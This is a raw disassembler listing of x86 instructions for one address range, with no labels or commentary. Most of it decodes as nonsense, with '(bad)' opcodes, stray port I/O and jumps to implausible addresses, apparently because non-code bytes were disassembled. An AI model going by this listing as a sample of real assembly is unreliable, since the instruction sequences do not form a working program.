  40c195:	(bad)
  40c198:	mov    bh,0x28
  40c19a:	xor    al,0xba
  40c19c:	push   cs
  40c19d:	loop   0x40c16d
  40c19f:	and    al,0xd9
  40c1a1:	fstp   st(2)
  40c1a3:	fimul  DWORD PTR [ebp-0x1c676c93]
  40c1a9:	ss sbb al,0xb4
  40c1ac:	and    ecx,DWORD PTR [esi]
  40c1ae:	mov    dh,BYTE PTR [esi+0x61dda370]
  40c1b4:	ins    BYTE PTR es:[edi],dx
  40c1b5:	push   cs
  40c1b6:	das    
  40c1b7:	aad    0x31
  40c1b9:	push   0x25
  40c1bb:	and    DWORD PTR [esi],edi
  40c1bd:	ins    DWORD PTR es:[edi],dx
  40c1be:	mov    ch,0xdd
  40c1c0:	mov    dh,0xcb
  40c1c2:	pop    ds
  40c1c3:	sbb    cl,dh
  40c1c5:	out    dx,al
  40c1c6:	sti    
  40c1c7:	dec    ecx
  40c1c8:	lods   eax,DWORD PTR ds:[esi]
  40c1c9:	sub    ebx,edx
  40c1cb:	lea    eax,[ebp+0x11fc23b6]
  40c1d1:	inc    esi
  40c1d2:	mov    ebp,0x2c517145
  40c1d7:	ins    DWORD PTR es:[edi],dx
  40c1d8:	cvtps2pi mm3,xmm5
  40c1db:	mov    WORD PTR [ecx],gs
  40c1dd:	leave  
  40c1de:	push   eax
  40c1df:	outs   dx,BYTE PTR ds:[esi]
  40c1e0:	sti    
  40c1e1:	add    eax,0xb1b64989
  40c1e6:	ins    DWORD PTR es:[edi],dx
  40c1e7:	sub    al,0x71
  40c1e9:	cmp    BYTE PTR [ecx],cl
  40c1eb:	or     esp,esi
  40c1ed:	sahf   
  40c1ee:	scas   al,BYTE PTR es:[edi]
  40c1ef:	cwde   
  40c1f0:	sub    DWORD PTR [ecx-0x43247a5e],eax
  40c1f6:	imul   ebp,DWORD PTR [ebp+0x3575a67a],0xffffff85
  40c1fd:	add    eax,0x80e542b6
  40c202:	lock xlat BYTE PTR ss:[ebx]
  40c205:	call   0xdb191ae2
  40c20a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c20b:	das    
  40c20c:	imul   ebx,DWORD PTR [eax+0x6fbea9f9],0xffffffc3
  40c213:	(bad)  
  40c214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c215:	lods   eax,DWORD PTR ds:[esi]
  40c216:	pop    ebp
  40c217:	dec    ecx
  40c218:	outs   dx,BYTE PTR ds:[esi]
  40c219:	int3   
  40c21a:	fwait
  40c21b:	xor    eax,0x2db5116e
  40c220:	pop    edx
  40c221:	imul   esi,DWORD PTR [edi-0x38f0568a],0x32
  40c228:	mov    eax,ds:0x87cd265
  40c22d:	repnz mov dh,0x2d
  40c230:	mov    bh,0x6d
  40c232:	test   BYTE PTR [ebx],bh
  40c234:	inc    ebp
  40c235:	pop    ecx
  40c236:	push   ebp
  40c237:	dec    edi
  40c238:	dec    eax
  40c239:	pop    edi
  40c23a:	inc    esi
  40c23b:	jecxz  0x40c29a
  40c23d:	pusha  
  40c23e:	popa   
  40c23f:	mov    eax,ds:0x476a4623
  40c244:	lea    ebx,[edx]
  40c246:	sar    DWORD PTR [esi+0x74],1
  40c249:	sub    DWORD PTR [ebp-0x13bcbb65],0x18
  40c250:	dec    esp
  40c251:	pop    es
  40c252:	xor    eax,0xb6c736c1
  40c257:	aam    0x6e
  40c259:	sbb    dh,BYTE PTR [ecx+esi*2]
  40c25c:	jle    0x40c2d3
  40c25e:	mov    bl,0xba
  40c260:	fimul  DWORD PTR [edx-0x69]
  40c263:	xchg   esi,eax
  40c264:	pop    esi
  40c266:	dec    ebp
  40c267:	out    dx,al
  40c268:	je     0x40c259
  40c26a:	sti    
  40c26b:	adc    eax,eax
  40c26d:	(bad)  
  40c26e:	mov    dh,0xe0
  40c270:	and    ch,BYTE PTR [ecx+0x4214b0b9]
  40c276:	int    0xad
  40c278:	ins    DWORD PTR es:[edi],dx
  40c279:	aaa    
  40c27a:	or     dl,BYTE PTR [ebx+0x77a35b30]
  40c280:	cli    
  40c281:	fwait
  40c282:	xlat   BYTE PTR ds:[ebx]
  40c283:	pop    ebx
  40c284:	in     eax,0xb7
  40c286:	mov    dh,0xe7
  40c288:	jge    0x40c2fb
  40c28a:	add    al,0x50
  40c28c:	sti    
  40c28d:	add    BYTE PTR [eax-0x4990c229],dl
  40c293:	in     eax,dx
  40c294:	push   es
  40c295:	or     ebp,DWORD PTR [ecx-0x541946f4]
  40c29b:	mov    ebp,ebp
  40c29d:	or     ch,dl
  40c29f:	mov    cl,0xb4
  40c2a1:	mov    al,0xd1
  40c2a3:	lods   eax,DWORD PTR ds:[esi]
  40c2a4:	sub    eax,0xf8220af5
  40c2a9:	jns    0x40c230
  40c2ab:	in     eax,dx
  40c2ac:	(bad)  
  40c2ad:	lods   eax,DWORD PTR ds:[esi]
  40c2ae:	mov    ebp,0x337500b7
  40c2b3:	es pop ebx
  40c2b5:	inc    edi
  40c2b6:	mov    bl,BYTE PTR [ebp+0x6d]
  40c2b9:	mov    ebx,0x260b52d
  40c2be:	pop    edi
  40c2bf:	or     BYTE PTR ds:0xee29bf68,al
  40c2c5:	enter  0xbb5b,0xd0
  40c2c9:	outs   dx,BYTE PTR ds:[esi]
  40c2ca:	imul   edx,DWORD PTR [edx+0x74c6839],0x70
  40c2d1:	or     BYTE PTR [esi+ecx*8+0xb0bb46e],bh
  40c2d8:	(bad)  
  40c2d9:	sti    
  40c2da:	out    dx,al
  40c2db:	loopne 0x40c27b
  40c2dd:	add    dl,BYTE PTR [edi+esi*2-0x4f]
  40c2e1:	xor    eax,0x12342c6e
  40c2e6:	mov    ?,WORD PTR [edx-0x1c]
  40c2e9:	xor    dl,al
  40c2eb:	inc    ebp
  40c2ec:	mov    dh,0xb0
  40c2ee:	mov    al,0xb4
  40c2f0:	xchg   dh,ch
  40c2f2:	es iret 
  40c2f4:	loop   0x40c2e1
  40c2f6:	fdivr  QWORD PTR [edi-0x1f24a43e]
  40c2fc:	shr    ch,cl
  40c2fe:	xchg   BYTE PTR ds:[ecx+0x6b58a92c],dl
  40c305:	push   ecx
  40c306:	ins    BYTE PTR es:[edi],dx
  40c307:	mov    ah,0xb
  40c309:	dec    ebx
  40c30a:	dec    ebp
  40c30b:	gs and eax,0x1e5f3fc2
  40c311:	std    
  40c312:	sub    ch,BYTE PTR [ebx+ecx*1+0x6d]
  40c316:	(bad)  
  40c317:	fidivr WORD PTR [edx+0x4f]
  40c31a:	cmc    
  40c31b:	push   ebx
  40c31c:	cli    
  40c31d:	fcmovnu st,st(2)
  40c31f:	mov    dh,0xd1
  40c321:	push   eax
  40c322:	push   edi
  40c323:	lods   al,BYTE PTR ds:[esi]
  40c324:	ja     0x40c359
  40c326:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c327:	sti    
  40c328:	popf   
  40c329:	mov    edx,ecx
  40c32b:	(bad)  
  40c32c:	lea    esi,[esi+0x1]
  40c32f:	xor    al,0x50
  40c331:	mov    cl,0xe9
  40c333:	and    DWORD PTR [eax+0xd0b08a],ecx
  40c339:	xchg   esi,eax
  40c33a:	xchg   BYTE PTR [eax-0x32],al
  40c33d:	mov    ebx,0x5b6db07a
  40c342:	mov    ebx,0xe3635d28
  40c347:	pop    edi
  40c348:	push   esi
  40c349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c34a:	out    0x2,eax
  40c34c:	sti    
  40c34d:	push   eax
  40c34e:	mov    edx,0xc343b0b1
  40c353:	jns    0x40c3a0
  40c355:	xor    BYTE PTR [eax],bh
  40c357:	sub    DWORD PTR [eax],esp
  40c359:	ret    0x54b6
  40c35c:	outs   dx,BYTE PTR ds:[esi]
  40c35d:	push   esi
  40c35e:	pop    esi
  40c35f:	add    eax,0xf50ef9ec
  40c364:	cmp    dh,BYTE PTR [esi+0x49d2fcad]
  40c36a:	mov    al,0x73
  40c36c:	xchg   ebp,eax
  40c36d:	add    BYTE PTR [ebp*2+0x5af878e6],ch
  40c374:	mov    al,0x5d
  40c376:	fdiv   DWORD PTR [esi]
  40c378:	setp   ch
  40c37b:	mov    esp,0x5cbd8d76
  40c380:	call   FWORD PTR [edx]
  40c382:	mov    bh,0x85
  40c384:	lods   eax,DWORD PTR ds:[esi]
  40c385:	jns    0x40c3a1
  40c387:	dec    edx
  40c388:	sbb    edx,esp
  40c38a:	jno    0x40c3d9
  40c38c:	rcr    BYTE PTR [ebx],1
  40c38e:	mov    dh,0x6d
  40c390:	arpl   bx,bx
  40c392:	adc    DWORD PTR [ebx+0x56],esp
  40c395:	lods   al,BYTE PTR ds:[esi]
  40c396:	paddq  mm3,mm5
  40c399:	xor    esp,DWORD PTR [ebx]
  40c39b:	jp     0x40c3fc
  40c39d:	fstp   st(0)
  40c39f:	xchg   esi,eax
  40c3a0:	inc    esp
  40c3a1:	mov    ch,BYTE PTR [esi-0x7e]
  40c3a4:	add    BYTE PTR [ebx],al
  40c3a6:	and    BYTE PTR [ebx],0xb9
  40c3a9:	in     eax,dx
  40c3aa:	mov    dh,0xb5
  40c3ac:	or     eax,DWORD PTR [esi+0x2]
  40c3af:	repnz adc DWORD PTR [edx+edx*4-0x1a],eax
  40c3b4:	out    0x87,eax
  40c3b6:	mov    eax,ds:0x4b6e3615
  40c3bb:	sbb    eax,0xbe1b62b
  40c3c0:	add    BYTE PTR [ecx+0x16961701],ah
  40c3c6:	mov    ds:0xce0af5ad,al
  40c3cb:	push   ds
  40c3cc:	adc    BYTE PTR [eax+eiz*8+0xad85a5b],al
  40c3d3:	push   0x20
  40c3d5:	rcl    BYTE PTR [ebx],0x23
  40c3d8:	xor    bl,cl
  40c3da:	jecxz  0x40c37e
  40c3dc:	jo     0x40c43f
  40c3de:	popa   
  40c3df:	pop    esi
  40c3e0:	sar    eax,0x9d
  40c3e3:	or     cl,ch
  40c3e5:	std    
  40c3e6:	(bad)  [esi-0x53446bd3]
  40c3ec:	retf   
  40c3ed:	lds    ebp,FWORD PTR [eax+0x68]
  40c3f0:	xchg   esi,eax
  40c3f1:	xchg   ebp,eax
  40c3f2:	je     0x40c3aa
  40c3f4:	aad    0x6e
  40c3f6:	mov    ah,0x71
  40c3f8:	out    dx,eax
  40c3f9:	dec    eax
  40c3fa:	xchg   ebx,eax
  40c3fb:	loop   0x40c453
  40c3fd:	(bad)  
  40c3fe:	pop    eax
  40c3ff:	sbb    eax,0xc6db1b1b
  40c404:	add    eax,0x710b0ded
  40c409:	int3   
  40c40a:	aad    0xba
  40c40c:	outs   dx,DWORD PTR ds:[esi]
  40c40d:	shr    DWORD PTR [esi+0x1b],1
  40c410:	or     eax,DWORD PTR [edi]
  40c412:	adc    al,0x0
  40c414:	mov    cl,0x83
  40c416:	in     eax,0x6a
  40c418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c419:	push   esi
  40c41a:	mov    ebx,0x88f6b1b4
  40c41f:	data16 neg BYTE PTR [edi+0x29]
  40c423:	sahf   
  40c424:	sbb    dl,BYTE PTR [ecx-0x3d3d2d3a]
  40c42a:	adc    eax,0x7f67ec6d
  40c42f:	push   0xb5becfbf
  40c434:	mov    ch,0xdb
  40c436:	add    al,0x62
  40c438:	adc    ecx,DWORD PTR [ebp+ebx*1-0x676b21e0]
  40c43f:	xchg   ecx,eax
  40c440:	add    BYTE PTR [edi+0x7e],dh
  40c443:	mov    eax,ds:0xf3c25db0
  40c448:	mov    edi,0xe62b01e5
  40c44d:	mov    es,WORD PTR [eax]
  40c44f:	test   al,al
  40c451:	fild   DWORD PTR [esi+0x63]
  40c454:	pop    ebx
  40c455:	push   es
  40c456:	es call 0xaa9de33d
  40c45c:	in     al,dx
  40c45d:	mov    al,0xb4
  40c45f:	sub    eax,0x94a0e36c
  40c464:	fsub   DWORD PTR [ecx-0x52257ff8]
  40c46a:	ins    DWORD PTR es:[edi],dx
  40c46b:	shl    BYTE PTR [esi+0x47352e8e],0xc
  40c472:	cld    
  40c473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c474:	es push 0xa2c2db1b
  40c47a:	pop    ss
  40c47b:	dec    edi
  40c47c:	add    ch,BYTE PTR [esi-0x38]
  40c47f:	stos   DWORD PTR es:[edi],eax
  40c480:	pop    esp
  40c481:	xor    eax,0xddab6dda
  40c486:	callw  0x8e15
  40c48a:	jg     0x40c4e6
  40c48c:	push   eax
  40c48d:	test   al,0x6c
  40c48f:	sbb    dl,BYTE PTR [esi-0x45c9e94a]
  40c495:	dec    edx
  40c496:	fstp   DWORD PTR [eax]
  40c498:	mov    ebx,0x703c2f6d
  40c49d:	pop    ebx
  40c49e:	push   0x4e8379b7
  40c4a3:	and    BYTE PTR [edi],dh
  40c4a5:	mov    gs,WORD PTR [edx-0x5fa5e23c]
  40c4ab:	jo     0x40c44e
  40c4ad:	push   ebp
  40c4ae:	sbb    al,0x78
  40c4b0:	push   ss
  40c4b1:	jo     0x40c4a0
  40c4b3:	mov    edx,esi
  40c4b5:	ins    DWORD PTR es:[edi],dx
  40c4b6:	mov    eax,ds:0x7679f7dd
  40c4bb:	push   ebx
  40c4bc:	hlt    
  40c4bd:	scas   al,BYTE PTR es:[edi]
  40c4be:	xlat   BYTE PTR ds:[ebx]
  40c4bf:	mov    eax,0x76b6dcf0
  40c4c4:	add    DWORD PTR [ebp-0x37c48cf8],0x9
  40c4cb:	mov    ecx,0x71b69546
  40c4d0:	pop    ebx
  40c4d1:	fisub  DWORD PTR [ebx]
  40c4d3:	inc    esi
  40c4d4:	mov    WORD PTR [esi+0x7d],?
  40c4d7:	and    BYTE PTR [edx+0x2bc59981],dh
  40c4dd:	push   ss
  40c4de:	fcmovb st,st(2)
  40c4e0:	iret   
  40c4e1:	cmp    eax,0x1fac205
  40c4e6:	and    DWORD PTR [eax-0x73ad2473],eax
  40c4ec:	int3   
  40c4ed:	(bad)  
  40c4ee:	sti    
  40c4ef:	clc    
  40c4f0:	in     al,0x32
  40c4f2:	(bad)  [esi-0x41c85453]
  40c4f8:	clc    
  40c4f9:	sub    eax,0x6c8fb47
  40c4fe:	sahf   
  40c4ff:	inc    edx
  40c500:	(bad)  [esi]
  40c502:	(bad)  
  40c503:	iret   
  40c504:	out    dx,eax
  40c505:	cmp    DWORD PTR [ebp+0x30],edi
  40c508:	push   ebx
  40c509:	inc    eax
  40c50a:	(bad)  
  40c50b:	add    al,0x1b
  40c50d:	test   DWORD PTR [esi+esi*1+0x2d],ebp
  40c511:	mov    WORD PTR [eax+0x2],es
  40c514:	shl    DWORD PTR [esi+0x2962db1b],1
  40c51a:	sbb    eax,0x9d21eeb1
  40c51f:	adc    al,0x4a
  40c521:	pop    ebx
  40c522:	pop    ebx
  40c523:	arpl   WORD PTR [ebx+0x59abbb03],di
  40c529:	js     0x40c52a
  40c52b:	es push es
  40c52d:	test   DWORD PTR [ecx],edi
  40c52f:	mov    al,0xb0
  40c531:	ins    DWORD PTR es:[edi],dx
  40c532:	ins    BYTE PTR es:[edi],dx
  40c533:	(bad)  
  40c534:	ins    DWORD PTR es:[edi],dx
  40c535:	sbb    esi,DWORD PTR [ebx]
  40c537:	push   eax
  40c538:	scas   al,BYTE PTR es:[edi]
  40c539:	icebp  
  40c53a:	xor    DWORD PTR [eax+0x68],ebx
  40c53d:	aas    
  40c53e:	cs in  eax,dx
  40c540:	daa    
  40c541:	jb     0x40c530
  40c543:	and    al,0x31
  40c545:	je     0x40c514
  40c547:	mov    ebp,0xdb54c36
  40c54c:	imul   esp,edi,0x5db442ef
  40c552:	fld    TBYTE PTR [eax-0x24]
  40c555:	push   ss
  40c556:	inc    eax
  40c557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c558:	loopne 0x40c534
  40c55a:	or     dh,al
  40c55c:	xchg   ebx,eax
  40c55d:	clc    
  40c55e:	es sbb eax,0x36702b74
  40c564:	mov    dh,0x51
  40c566:	and    BYTE PTR [edi],0x85
  40c569:	pop    ebx
  40c56a:	shr    al,0xb6
  40c56d:	mov    al,0x6d
  40c56f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c570:	mov    DWORD PTR [esp+eiz*4+0x19],0x6dbac563
  40c578:	ins    DWORD PTR es:[edi],dx
  40c579:	pop    ebx
  40c57a:	(bad)  
  40c57b:	sti    
  40c57c:	(bad)  
  40c57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c57e:	fst    QWORD PTR [eax]
  40c580:	push   ebp
  40c581:	inc    sp
  40c583:	in     eax,0x95
  40c585:	push   0x37
  40c587:	mov    dh,0x8d
  40c589:	adc    al,0xba
  40c58b:	add    al,0xd1
  40c58d:	xor    ch,BYTE PTR [edi+0x68]
  40c590:	xor    al,0x2
  40c592:	shl    BYTE PTR [ebp-0x25],cl
  40c595:	pop    eax
  40c596:	jecxz  0x40c5a1
  40c598:	cdq    
  40c599:	and    BYTE PTR [eax],0x80
  40c59c:	sar    dh,0xe3
  40c59f:	ret    0xcb12
  40c5a2:	fucomi st,st(7)
  40c5a4:	mov    edi,0x97dd001f
  40c5a9:	push   ss
  40c5aa:	cld    
  40c5ab:	(bad)  
  40c5ac:	ins    DWORD PTR es:[edi],dx
  40c5ad:	popa   
  40c5ae:	stos   DWORD PTR es:[edi],eax
  40c5af:	cld    
  40c5b0:	mov    ch,0x90
  40c5b2:	add    BYTE PTR [ecx+eax*2+0x4f],ch
  40c5b6:	retf   
  40c5b7:	adc    esi,ebp
  40c5b9:	cmc    
  40c5ba:	adc    edx,DWORD PTR [edi]
  40c5bc:	mov    dh,0x85
  40c5be:	pop    esi
  40c5bf:	sub    ecx,DWORD PTR [edi]
  40c5c1:	ds retf 0xd10
  40c5c5:	xor    eax,0xed02c76a
  40c5ca:	shl    BYTE PTR [ecx+0x11],cl
  40c5cd:	scas   eax,DWORD PTR es:[edi]
  40c5ce:	into   
  40c5cf:	ds nop
  40c5d1:	mov    ebp,ss
  40c5d3:	ss mov dh,0x85
  40c5d6:	add    eax,0x64df5f70
  40c5db:	sbb    cl,dl
  40c5dd:	push   es
  40c5de:	jecxz  0x40c5b6
  40c5e0:	lods   eax,DWORD PTR ds:[esi]
  40c5e1:	ins    BYTE PTR es:[edi],dx
  40c5e2:	pop    ss
  40c5e3:	sub    al,0x70
  40c5e5:	xor    al,0xb9
  40c5e7:	cld    
  40c5e8:	and    eax,eax
  40c5ea:	sbb    dh,bh
  40c5ec:	pusha  
  40c5ed:	(bad)  [esi+0x20a3be85]
  40c5f3:	add    al,0x8
  40c5f5:	test   eax,0xb6b61950
  40c5fa:	fcomp  DWORD PTR ss:[edx]
  40c5fd:	out    dx,eax
  40c5fe:	adc    al,0x9b
  40c600:	sub    BYTE PTR [edx],al
  40c602:	fs sti 
  40c604:	lods   eax,DWORD PTR ds:[esi]
  40c605:	sub    eax,0x77c116dc
  40c60a:	mov    esp,0xf4dfeb66
  40c60f:	retf   
  40c610:	out    dx,eax
  40c611:	(bad)  [esi]
  40c613:	xchg   esi,eax
  40c614:	mov    dh,0xdb
  40c616:	sbb    eax,0x817a5082
  40c61b:	xlat   BYTE PTR ds:[ebx]
  40c61c:	cmc    
  40c61d:	js     0x40c60e
  40c61f:	sub    esi,DWORD PTR [edi-0x23979e93]
  40c625:	sub    al,0xf8
  40c627:	mov    edi,0x17171180
  40c62c:	(bad)  
  40c62d:	lea    ebp,[ebp-0x2ad7078f]
  40c633:	push   eax
  40c634:	cli    
  40c635:	and    DWORD PTR [esi],edi
  40c637:	and    BYTE PTR [esi+0x58],ah
  40c63a:	pop    eax
  40c63b:	fidiv  DWORD PTR [esi+0x2f417abf]
  40c641:	ror    DWORD PTR [eax+edx*1+0x54],1
  40c645:	mov    dh,0xd5
  40c647:	adc    ah,bl
  40c649:	adc    eax,0x2d5f5317
  40c64e:	jmp    0x40c6c9
  40c650:	lds    esi,FWORD PTR [esi+0x3ed1bb6]
  40c656:	inc    esi
  40c657:	(bad)
  40c65c:	pushf  
  40c65d:	pop    eax
  40c65e:	jb     0x40c68c
  40c660:	fcom   QWORD PTR [esi+0xb68817]
  40c666:	daa    
  40c667:	into   
  40c668:	in     al,dx
  40c669:	dec    esp
  40c66a:	scas   al,BYTE PTR es:[edi]
  40c66b:	adc    esp,DWORD PTR [bp-0x25ea]
  40c670:	lods   eax,DWORD PTR ds:[esi]
  40c671:	and    esi,DWORD PTR [esi]
  40c673:	dec    eax
  40c674:	dec    edx
  40c675:	add    al,0xc9
  40c677:	cmp    al,0x6e
  40c679:	sub    eax,0xfe1e1b6c
  40c67e:	clc    
  40c67f:	cmc    
  40c680:	fbld   TBYTE PTR [esi-0x27d2167b]
  40c686:	pop    eax
  40c687:	call   0x10655194
  40c68c:	fidiv  WORD PTR [edx+0x1d]
  40c68f:	sub    eax,0xfcdb625d
  40c694:	inc    edx
  40c695:	ret    0x5ed1
  40c698:	xchg   esp,eax
  40c699:	add    DWORD PTR [edx],eax
  40c69b:	cmp    DWORD PTR [ebp+0x6c],ebp
  40c69e:	dec    ebx
  40c69f:	xcrypt-ctr (bad)
  40c6a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6a1:	fst    DWORD PTR [ebp+0x3940831f]
  40c6a7:	loope  0x40c6e0
  40c6a9:	mov    dh,0x5
  40c6ab:	mov    bh,0xb0
  40c6ad:	push   ebp
  40c6ae:	pop    edi
  40c6af:	mov    eax,0x1b96a185
  40c6b4:	repnz mov esi,0xab605c1
  40c6ba:	pop    es
  40c6bb:	std    
  40c6bc:	inc    ecx
  40c6bd:	sbb    esi,eax
  40c6bf:	daa    
  40c6c0:	or     esi,DWORD PTR [esi+ebp*2-0x466a89e3]
  40c6c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6c8:	jecxz  0x40c737
  40c6ca:	fistp  DWORD PTR [edi+0x6e05e5db]
  40c6d0:	xchg   BYTE PTR [edx+0xa6b168],cl
  40c6d6:	aad    0xcd
  40c6d8:	mov    dl,0xfe
  40c6da:	shl    DWORD PTR [edi-0x1392d01b],cl
  40c6e0:	jecxz  0x40c720
  40c6e2:	stos   DWORD PTR es:[edi],eax
  40c6e3:	add    dl,bl
  40c6e5:	mov    eax,0x8158100
  40c6ea:	inc    ebx
  40c6eb:	aaa    
  40c6ec:	test   eax,0x490b5a36
  40c6f1:	(bad)  
  40c6f2:	in     eax,0x39
  40c6f4:	sub    BYTE PTR [edx],dh
  40c6f6:	mov    ch,0x1b
  40c6f8:	in     eax,dx
  40c6f9:	inc    edx
  40c6fa:	push   edx
  40c6fb:	add    eax,0x5cc08999
  40c700:	jnp    0x40c71f
  40c702:	sub    al,0x2d
  40c704:	sub    eax,0x6e47ec2d
  40c709:	and    eax,0x4644c2aa
  40c70e:	gs popa 
  40c710:	pop    ebx
  40c711:	outs   dx,BYTE PTR ds:[esi]
  40c712:	push   ds
  40c713:	jg     0x40c727
  40c715:	mov    ebp,0xeff42674
  40c71a:	fld    TBYTE PTR [esi]
  40c71c:	ins    BYTE PTR es:[edi],dx
  40c71d:	sbb    edi,DWORD PTR [ecx]
  40c71f:	jmp    0x1d58:0x10139e83
  40c726:	clc    
  40c727:	xor    eax,0x42fcb6ad
  40c72c:	scas   eax,DWORD PTR es:[edi]
  40c72d:	ss test eax,0x41807a00
  40c733:	stos   BYTE PTR es:[edi],al
  40c734:	cmp    eax,0x8d85a2d6
  40c739:	pop    eax
  40c73a:	cmp    DWORD PTR [ebx+0x4d5938e5],esp
  40c740:	sub    eax,0xb8eb52d5
  40c745:	cmc    
  40c746:	jg     0x40c7a4
  40c748:	mov    ecx,0x61606977
  40c74d:	popa   
  40c74e:	mov    eax,ds:0x2b800762
  40c753:	in     eax,dx
  40c754:	rcr    BYTE PTR [eax],1
  40c756:	mov    bh,0xb6
  40c758:	pop    ebp
  40c759:	pop    eax
  40c75a:	pop    edx
  40c75b:	lds    ebx,FWORD PTR [edx-0xd888cf8]
  40c761:	inc    ecx
  40c762:	jmp    0x346baefa
  40c767:	pusha  
  40c768:	push   0x544ba6ce
  40c76d:	and    eax,0x5b754db5
  40c772:	sti    
  40c773:	dec    ebp
  40c774:	pop    ss
  40c775:	cmp    DWORD PTR [eax+edi*8-0x18],esi
  40c779:	sbb    dl,BYTE PTR [esi-0x4a]
  40c77c:	fcmovnbe st,st(6)
  40c77e:	add    bl,BYTE PTR cs:[ebx-0x5dee6d77]
  40c785:	cmc    
  40c786:	sbb    eax,0x2d4bc295
  40c78b:	rcr    al,1
  40c78d:	push   ss
  40c78e:	pop    esi
  40c78f:	popa   
  40c790:	and    BYTE PTR [edi-0x67],0x33
  40c794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c795:	or     ebp,DWORD PTR [ebx+ebx*2-0x45]
  40c799:	das    
  40c79a:	(bad)
  40c79d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c79e:	ins    DWORD PTR es:[edi],dx
  40c79f:	xor    eax,0x5a502d4d
  40c7a4:	(bad)  
  40c7a6:	mov    ds:0x54df472d,al
  40c7ab:	push   es
  40c7ac:	or     BYTE PTR [edi-0x2569e925],ah
  40c7b2:	xor    al,0x8e
  40c7b4:	push   es
  40c7b5:	fadd   QWORD PTR [ebp-0x7cfc16c3]
  40c7bb:	mov    bh,0x85
  40c7bd:	(bad)  
  40c7be:	ins    DWORD PTR es:[edi],dx
  40c7bf:	jae    0x40c79e
  40c7c1:	repnz mov edx,0xa7b5221f
  40c7c7:	adc    eax,0xdc2db4ec
  40c7cc:	pop    edx
  40c7cd:	sar    DWORD PTR [eax],cl
  40c7cf:	int3   
  40c7d0:	xlat   BYTE PTR ds:[ebx]
  40c7d1:	pop    ebx
  40c7d2:	leave  
  40c7d3:	add    eax,0x360f8578
  40c7d8:	adc    eax,0xb6e2e2dc
  40c7dd:	inc    ebp
  40c7de:	(bad)  
  40c7df:	ins    DWORD PTR es:[edi],dx
  40c7e0:	(bad)  [esi+0x580e77c2]
  40c7e6:	fld    QWORD PTR [edi+ebx*2-0x10]
  40c7ea:	jmp    0x5764544
  40c7ef:	mov    bh,0xda
  40c7f1:	cmp    BYTE PTR [edx-0x65],al
  40c7f4:	inc    esi
  40c7f5:	sub    BYTE PTR [edx],cl
  40c7f7:	mov    edx,0xb82bb6c8
  40c7fc:	mov    al,0xa7
  40c7fe:	das    
  40c7ff:	lods   al,BYTE PTR ds:[esi]
  40c800:	adc    esi,DWORD PTR [ebp+0x53]
  40c803:	push   ss
  40c804:	and    ah,BYTE PTR [ebx]
  40c806:	ins    BYTE PTR es:[edi],dx
  40c807:	add    eax,0x919eb768
  40c80c:	pop    es
  40c80d:	mov    dh,0xb5
  40c80f:	je     0x40c863
  40c811:	(bad)  
  40c812:	mov    dh,0xd1
  40c814:	cs cmp eax,0x3f8f85c1
  40c81a:	popf   
  40c81b:	add    eax,0x6ed63cb4
  40c820:	ins    DWORD PTR es:[edi],dx
  40c821:	in     eax,dx
  40c822:	xchg   edx,eax
  40c823:	add    eax,0xa32b6bc2
  40c828:	pop    eax
  40c829:	and    eax,0xb5b15305
  40c82e:	fcmovnb st,st(2)
  40c830:	jmp    0x40c81a
  40c832:	gs dec edx
  40c834:	add    edi,DWORD PTR [ecx+edi*4+0x4ba708d7]
  40c83b:	adc    eax,0xd490396e
  40c840:	lods   al,BYTE PTR ds:[esi]
  40c841:	jle    0x40c85e
  40c843:	pop    ebx
  40c844:	ret    0x85d5
  40c847:	lods   eax,DWORD PTR ds:[esi]
  40c848:	lods   eax,DWORD PTR ds:[esi]
  40c849:	sub    al,0xaf
  40c84b:	sbb    BYTE PTR [edi],bl
  40c84d:	jo     0x40c8ce
  40c84f:	sahf   
  40c850:	addr16 push ebx
  40c852:	mov    ebx,0xef4d36d1
  40c857:	into   
  40c858:	mov    dh,0x57
  40c85a:	jbe    0x40c7e9
  40c85c:	jp     0x40c8b7
  40c85e:	fist   DWORD PTR [esi+0x6b]
  40c861:	push   eax
  40c862:	stc    
  40c863:	in     al,0x8
  40c865:	ins    DWORD PTR es:[edi],dx
  40c866:	sbb    al,0x3b
  40c868:	rol    BYTE PTR [esi],1
  40c86a:	mov    eax,0x71c86db0
  40c86f:	imul   eax,esi,0xffffffac
  40c872:	(bad)  
  40c873:	scas   eax,DWORD PTR es:[edi]
  40c874:	push   ebp
  40c875:	rcl    BYTE PTR [ecx],1
  40c877:	mov    bh,0xc2
  40c879:	sbb    eax,0xba7c16b
  40c87e:	ret    0xae0
  40c881:	test   eax,0x4cb0be5d
  40c886:	pop    esi
  40c887:	push   0x19
  40c889:	jbe    0x40c88b
  40c88b:	xlat   BYTE PTR ds:[ebx]
  40c88c:	(bad)  
  40c88d:	rcl    BYTE PTR [ebp+0x60b5b8cf],cl
  40c893:	arpl   WORD PTR [ebx],si
  40c895:	or     DWORD PTR [esi+0x18049555],edi
  40c89b:	test   edx,eax
  40c89d:	scas   al,BYTE PTR es:[edi]
  40c89e:	pop    eax
  40c89f:	jae    0x40c917
  40c8a1:	mov    cl,0x7f
  40c8a3:	mov    BYTE PTR [esp+edi*2+0x61],cl
  40c8a7:	fld    TBYTE PTR [eax-0x25]
  40c8aa:	push   eax
  40c8ab:	push   ebx
  40c8ac:	or     ebp,DWORD PTR [esi-0x6e]
  40c8af:	jle    0x40c91e
  40c8b1:	cmp    esi,DWORD PTR [esi]
  40c8b3:	jns    0x40c90b
  40c8b5:	add    DWORD PTR [eax+0x62],ebx
  40c8b8:	mov    ebp,0x76d26b5e
  40c8bd:	sub    eax,0x2c6dbb4
  40c8c2:	in     al,0x15
  40c8c4:	xor    eax,0xf4a7f324
  40c8c9:	call   0xb72e3684
  40c8ce:	adc    edx,ebx
  40c8d0:	or     esi,0xffffffd7
  40c8d3:	xchg   edx,eax
